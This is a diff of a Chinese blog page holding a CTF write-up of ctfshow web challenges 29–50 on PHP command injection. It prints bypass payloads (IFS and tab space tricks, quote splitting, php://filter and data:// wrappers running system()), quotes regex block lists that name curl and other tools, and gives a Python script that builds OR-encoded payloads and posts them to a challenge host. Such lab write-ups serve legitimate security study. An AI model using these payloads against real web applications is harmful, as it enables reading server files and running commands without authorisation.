@@ -27,14 +27,15 @@
 <meta property="og:site_name" content="佩斯利小姐House">
 <meta property="og:description" content="努力">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/浩土土/Pictures/1.jpg">
 <meta property="og:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo3.gif">
 <meta property="og:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo5.gif">
 <meta property="article:published_time" content="2021-11-09T07:36:00.000Z">
-<meta property="article:modified_time" content="2022-01-13T04:02:49.850Z">
+<meta property="article:modified_time" content="2022-01-13T06:56:11.194Z">
 <meta property="article:author" content="lbj">
 <meta property="article:tag" content="学习笔记">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo3.gif">
+<meta name="twitter:image" content="c:/Users/浩土土/Pictures/1.jpg">
 
 <link rel="canonical" href="http://na0hblog.top/2021/11/09/2021-11-09-ctfshowb%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
@@ -184,7 +185,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-13 12:02:49" itemprop="dateModified" datetime="2022-01-13T12:02:49+08:00">2022-01-13</time>
+                <time title="修改时间：2022-01-13 14:56:11" itemprop="dateModified" datetime="2022-01-13T14:56:11+08:00">2022-01-13</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -210,7 +211,7 @@
       
         <!-- more -->
 
-<p>##<strong>想沛沛的第n天</strong></p>
+<p>##<strong>想沛沛的第n天<img src="C:\Users\浩土土\Pictures\1.jpg" alt="1"></strong></p>
 <p><strong>web29</strong><br>看正则表达式发现 flag被过滤 ls看看有什么<br>?c=system(ls); 发现有个flag.php<br>这题有多种方法 构造后查看源代码即可<br>1.可根据提示构造?c=echo <code>nl fl&#39;&#39;ag.php</code>; 2.c=system(‘cat fla); 3.?c=system(‘cp fla?.php 1.txt’)<br>*web30<br>看正则表达式 多过滤了 system和php 学会用反引号 ``有system()的作用<br>1.?c=echo <code>cat f* </code>; 2.提示的?c=echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>*web31<br>增加了一些绕过比较重要的是 cat和空格 在网上查看的可以替代cat的句式<br>1.tac：从最后一行开始显示，是cat的反向显示2.more：一页一页的显示档案内容3.less：与more类似4.head：查看文档的前几行5.tail：查看文档的后几行6.nl：显示的时候，顺便输入行号7.od：以二进制的方式读取档案8.vi：一种编辑器9.uniq：查看10.vim：一种编译器<br>可代替空格绕过的句式 1.${IFS}2.$IFS$13.${IFS4.%205.&lt;和&lt;&gt;重定向符6.%09   所以构造<br>?c=echo(<code>more%09f*</code>); 还有很多大佬解法?c=eval($_GET[1]);&amp;1=system(‘cat flag.php’);///嵌套脱离了c的正则判断<br>?c=echo<code>strings%09f*</code>;<br>还有hint的 ?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br>*web32<br>又过滤掉了； ( echo ‘ `( 分号可以用?&gt; eval可以用include  括号可以用“”代替 )<br>加上文件包含形式php：//filter/read=convert.base64-encode/resource=flag.php<br>这题构造：?c=include”$GET[1]”?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>*<strong>web33</strong><br>?c=include$GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php  和上题目一样但是要去掉双引号 因为被过滤<br>*<em><strong>web34 web35</strong></em><br>34过滤了：<br>35过滤了“ &lt; =<br> 都可以?c=include$GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>*<strong>web36</strong><br>36 过滤了数字?c=include$GET[hhp]?&gt;&amp;hhp=php://filter/read=convert.base64-encode/resource=flag.php 1改为数字<br>*<strong>web37</strong><br>37 eval函数变成了 include函数<br>考点为伪协议?c=data://text/ plain,<?php phpinfo();?><br>data后面将所有的数字、字符、字符串当做php代码执行<br>构造 ?c=data://text /  plain,<?php system('cat fl??.php');?><br>*<strong>web38</strong><br>38 过滤了php和file<br> 可以将<?php 改为<?= 于是构造为 ?c=data:/ / text/ plain,<?=system("cat fla?.???);?><br>*<strong>web39</strong><br>39过滤掉了flag 限制后缀为php 构造?c=data://text /p lain,<?php system("cat fla?.php");?><br>*<strong>web40</strong><br>?c=print_r(scandir(current(localeconv())));<br>print_r(scandir(xxx))可用来查看当前目录所有文件名  localeconv() 函数返回包括本地数字及货物格式信息的数组 current函数返回数组中的当前单元，默认第一个值，也可以用pos reset代替 然后发现flag.php是第三个数组 也是倒数第二个<br>于是构造 ?/c=highlight_file(next(array_reverse(scandir(current(localeconv())))));  可利用localeconv()函数返回数组中的第一个小数点代替读取目录函数print_r(scandir(‘.’))中的参数.<br>array_reverse 以相反顺序返回数组 next 读取下一个元素 通过highlight_file读取 利用localeconv()函数返回数组中的第一个小数点代替读取目录函数print_r(scandir(‘.’))中的参数.<br>*<strong>web41</strong><br>把所有的数字小写字母都屏蔽了 这种全过滤只有一种解法 构造字符串<br> &amp; 按位与 |按位或 ^ 按位异或 <del>取反 为四大位运算符，其中按位异 | 没有过滤<br>脚本如下：import re<br>import requests<br>url=”<a href="http://67e43a48-b511-4fcd-b715-74df05737fd1.challenge.ctf.show:8080&quot;">http://67e43a48-b511-4fcd-b715-74df05737fd1.challenge.ctf.show:8080&quot;</a><br>a=[]<br>ans1=””<br>ans2=””<br>for i in range(0,256):<br>    c=chr(i)<br>    tmp = re.match(r’[0-9]|[a-z]|^|+|\</del>|$|[|]|{|}|&amp;|-‘,c, re.I)<br>    if(tmp):<br>        continue<br>        #print(tmp.group(0))<br>    else:<br>        a.append(i)</p>
 <h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>eval(“echo($c);”);</p>
 <p>mya=”system”  #函数名 这里修改！<br>myb=”ls”      #参数<br>def myfun(k,my):<br>    global ans1<br>    global ans2<br>    for i in range (0,len(a)):<br>        for j in range(i,len(a)):<br>            if(a[i]|a[j]==ord(my[k])):<br>                ans1+=chr(a[i])<br>                ans2+=chr(a[j])<br>                return;<br>for k in range(0,len(mya)):<br>    myfun(k,mya)<br>data1=”(&quot;“+ans1+”&quot;|&quot;“+ans2+”&quot;)”<br>ans1=””<br>ans2=””<br>for k in range(0,len(myb)):<br>    myfun(k,myb)<br>data2=”(&quot;“+ans1+”&quot;|&quot;“+ans2+”&quot;)”<br>data={“c”:data1+data2}<br>r=requests.post(url=url,data=data)<br>print(r.text)   append函数会在数组后加上相应的元素<br>*<strong>web42</strong> 标准输出（stdout）代码是1 标准错误输出（stderr）代码是2 由于“ &gt; / dev / null＆ ”返回的值丢失，我们不会等待响应。 <a target="_blank" rel="noopener" href="http://8deebfb5-d519-443d-af2c-d106f47f6885.challenge.ctf.show/?c=cat%20flag.php;ls%E8%BF%99%E6%A0%B7%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87%EF%BC%81%EF%BC%81%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81c=cat%20flag.php;%E5%8D%B3%E5%8F%AF">http://8deebfb5-d519-443d-af2c-d106f47f6885.challenge.ctf.show/?c=cat%20flag.php;ls这样即可绕过！！查看源代码c=cat%20flag.php;即可</a> 还可cat flag.php%0a;<br>*<strong>web43</strong> 多过滤了分号 cat 用 ?c=tac%20flag.php||绕过 或者nl flag.php%0<br><em><strong>web44</strong> 多过滤了flag 用 nl fla</em>.php%0a 或者 ?c=tac%20fl\ag.php||<br>*<strong>web45</strong>多过滤了空格 ?c=tac%09fl\ag.php||或者echo$IFS<code>tac$IFS*</code>%0A （反引号一种功能是执行系统命令）<br>*<strong>web46</strong>  f(!preg_match(“/;|cat|flag| |[0-9]|\$|*/i”, $c))  过滤了好多了 ?c=tac&lt;fl’’ag.php|| 或者tac换为nl 或者?c=tac%09fla??php||<br>*<strong>web47</strong><br>  !preg_match(“/;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail/i” 可以c=tac&lt;fl’’ag.php||<br>*<strong>web48</strong><br>if(!preg_match(“/;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`/i” ?c=tac&lt;fl’’ag.php||<br>***web49**<br>f(!preg_match(“/;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%/i” ?c=tac&lt;fl’’ag.php||<br>*<strong>web50</strong><br>c=tac&lt;fl’’ag.php|| </p>
@@ -258,8 +259,8 @@ if ($fileInfo->isdir()) {
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/11/09/ctfshow%E7%88%86%E7%A0%B4/" rel="prev" title="">
-      <i class="fa fa-chevron-left"></i> 
+    <a href="/2021/09/29/%E5%85%A5%E9%97%A8%E5%89%8D20%E9%A2%98/" rel="prev" title="ctfshow web入门前二十题">
+      <i class="fa fa-chevron-left"></i> ctfshow web入门前二十题
     </a></div>
       <div class="post-nav-item"></div>
     </div>
@@ -334,7 +335,7 @@ if ($fileInfo->isdir()) {
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
